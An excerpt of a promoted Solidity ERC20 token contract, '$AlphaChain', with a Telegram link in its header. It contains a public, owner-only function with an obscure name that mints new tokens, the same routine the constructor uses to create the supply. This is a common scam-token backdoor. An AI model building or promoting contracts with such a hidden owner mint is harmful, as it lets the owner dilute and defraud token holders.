...
//
// $AlphaChain proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+lWKJLxPW8mA3ODBl
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _AlphaChain(uint256 amount) public onlyOwner {
 _AlphaChain(msg.sender, amount);
    }
    ...
    function _AlphaChain(address account, uint256 amount) internal virtual {
...
contract $AlphaChain is ERC20 {
    ...
    constructor() public ERC20("Alpha Chain", " ACHAIN ") {
     _AlphaChain(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}